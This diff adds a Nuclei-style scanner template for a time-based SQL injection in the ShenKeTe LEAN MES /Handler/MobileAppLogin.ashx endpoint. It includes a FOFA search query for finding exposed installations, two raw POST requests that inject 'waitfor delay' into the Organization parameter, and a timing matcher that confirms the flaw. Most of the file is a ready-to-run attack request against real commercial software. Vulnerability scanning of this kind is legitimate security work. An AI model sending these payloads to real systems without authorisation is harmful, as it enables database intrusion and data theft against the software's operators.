@@ -1,0 +1,36 @@
+id: ShenKeTe-LEAN-MES-MobileAppLogin_ashx-SQL-Time
+
+info:
+  name: 深科特 LEAN MES /Handler/MobileAppLogin.ashx SQL延时注入
+  author: HuanXiong
+  severity: high
+  description: |-
+    fofa: (title="LEAN MES - 用户登录" && body="LEAN MES") || body="Content/js/skt.utility.checkmobile.js" || body="../MobileApp/VerifyError.aspx" || body="Content/login/login2/multiplant_top.png"
+    深科特 LEAN MES /Handler/MobileAppLogin.ashx 接口存在SQL延时注入漏洞，攻击者可以通过构造恶意SQL语句执行延时注入，探测数据库信息，在特定条件下可进一步获取数据库敏感数据或执行系统命令。
+  reference:
+    -
+  tags: SQL-Time, ShenKeTe, LEAN-MES
+
+http:
+  - raw:
+      - |-
+        POST /Handler/MobileAppLogin.ashx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
+
+        Action=checkmesurl&Organization='waitfor delay'0:0:4'--
+
+      - |-
+        POST /Handler/MobileAppLogin.ashx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
+
+        Action=checkmesurl&Organization='waitfor delay'0:0:8'--
+
+    matchers:
+      - type: dsl
+        name: SQL延时注入
+        dsl:
+          - "status_code==200 && duration_1>=4 && duration_1<=5 && duration_2>=8 && duration_2<=9"
